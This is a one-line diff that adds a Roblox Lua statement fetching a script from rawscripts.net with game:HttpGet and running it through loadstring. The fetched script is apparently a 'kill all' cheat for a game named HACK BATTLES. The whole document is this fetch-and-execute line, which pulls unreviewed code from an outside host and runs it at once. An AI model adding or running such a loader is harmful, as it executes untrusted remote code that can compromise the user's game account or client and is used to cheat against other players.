@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://rawscripts.net/raw/HACK-BATTLES!-Hck-battles-kill-all-script-63925"))()
